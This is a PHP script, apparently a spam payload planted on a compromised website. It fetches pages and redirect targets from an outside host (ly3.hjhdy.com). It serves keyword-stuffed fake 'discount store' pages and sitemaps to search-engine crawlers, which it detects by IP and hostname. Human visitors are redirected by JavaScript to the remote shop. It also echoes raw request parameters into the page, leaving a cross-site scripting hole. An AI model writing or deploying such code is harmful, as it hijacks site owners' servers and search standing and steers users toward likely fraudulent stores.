<?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$sitemap_= $http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."?s=s&type=2&kk=3&g=".mt_rand(1,14)."&pnum=".mt_rand(1,15)."";
if(!is_null($_GET['g']))
{
$jd=file_get_contents("http://ly3.hjhdy.com/1.aspx?sz=".$_GET['g']);
$sz=$_GET['g'];
}
else
{
$jd=file_get_contents("http://ly3.hjhdy.com/1.aspx?xy=".$http_type);
$sz=file_get_contents("http://ly3.hjhdy.com/1.aspx?jd=".$jd);
}

$hyzhdy=$jd."JG999.aspx";
$surl=$jd."S888.aspx";


if(!is_null($_GET['s']))
{
$surl=$surl."?number=".$_GET['number']."&pnum=".$_GET['pnum']."&cid=".$_GET['cid']."&type=".$_GET['type'];
$str=file_get_contents($surl);
$str=str_replace('yymm', $http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'],$str);
$str=str_replace('ggggg', $sz,$str);
header("Content-type:text/xml");
echo $str;
exit();
}

$kname="";
if(!is_null($_GET['shop'])){
$kname= urldecode($_GET['shop']);
}
$ip=GetIp();
if(!is_null($_GET['kk'])){$ip="66.249.64.190";}
$domain = file_get_contents("http://ly3.hjhdy.com/getdomain.aspx?rnd=1&ip=".$ip);
$ddd=$jd."a.aspx";
if(stripos($domain,'google')!=false or stripos($domain,'msn.com')!=false or stripos($domain,'yahoo.com')!=false or stripos($domain,'aol.com')!=false or stripos($domain,'yandex')!=false){}
else
	{
	if(!is_null($_GET['iid'])||!is_null($_GET['shop']))	 
	{

       $kname= urldecode($_GET['shop']);
       echo '<script>document.location="'.$ddd."?cid=".$_GET['cid']."&cname=".urlencode($kname).'"</script>';
       exit();
	}
	if(!is_null($_GET['pnum']))	 
	{
		$txt=str_replace("products.aspx","",$ddd)."?cid=".$_GET['cid']."";
        echo '<script>document.location="'.$txt.'"</script>';
		exit();
	}
    }		
    function GetIp(){
      if (!empty($_SERVER['HTTP_CLIENT_IP']))
     
      {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
      }
      elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
      
      {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
      }
      else
      {
        $ip=$_SERVER['REMOTE_ADDR'];
      }
      return $ip;
} 
   ?> 
<html>
<head>
<script>
document.cookie="u="+window.location.href;
</script>
<title><?php error_reporting(E_ALL^E_NOTICE^E_WARNING); echo $kname?> -  OFF-<?php echo mt_rand(50,70)?>% >Free shipping</title>
<meta name="keywords" content="<?php echo $kname?>"/>
<meta name="description" content="Clear warehouse > OFF-<?php echo mt_rand(50,70)?>% <?php echo $kname?> Best Cheap Online Shopping Site: Join our store and discover millions of high quality discounted products to make your shopping fun and rewarding. Free home delivery!<?php echo $_GET['searchtxt']?>" />
<meta name="robots" content="index,follow,all"/>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<link rel="sitemap" type="application/xml" title="Sitemap" href="<?php echo $sitemap_?>" />
</head>
<body>

<?php

if(!is_null($_GET['iid'])){

$hyzhdy=$hyzhdy."?iid=".urlencode($_GET['iid'])."&cid=".$_GET['cid'];
 }
 else if(!is_null($_GET['shop'])){
	 $hyzhdy=$hyzhdy."?shop=".urlencode($_GET['shop'])."&cid=".$_GET['cid'];
 }
 else
 {
	if(!is_null($_GET['pnum']))
	{
		$hyzhdy=$hyzhdy."?cid=".$_GET['cid']."&pnum=".$_GET['pnum'];
	}
 }
 $str = file_get_contents($hyzhdy);
 $str=str_replace('ggggg', $sz,$str);
 $str=str_replace('IIIII',$http_type.$_SERVER['HTTP_HOST'],$str);
 $str=str_replace('UUUUU',$http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'],$str);
 $str=str_replace('HHHHH',$http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'],$str);
 $str=str_replace('BBBBB',$_SERVER['HTTP_HOST'],$str);
 $str=str_replace('NNNNN',$kname.$_GET['iid'],$str);
 $str=str_replace('SSSSS',$kname.$_GET['iid'].$_GET['pnum'],$str);
 $str=str_replace('DDDDD',$kname."<div style='display: block'><ul><li>Related links: <a href='".$_SERVER['SCRIPT_NAME']."?g=".mt_rand(1,14)."&pnum=".mt_rand(1,30)."'>Plus</a></ul></div>".$_GET['searchtxt'],$str);
 echo $str;

?> 

</body>
</html>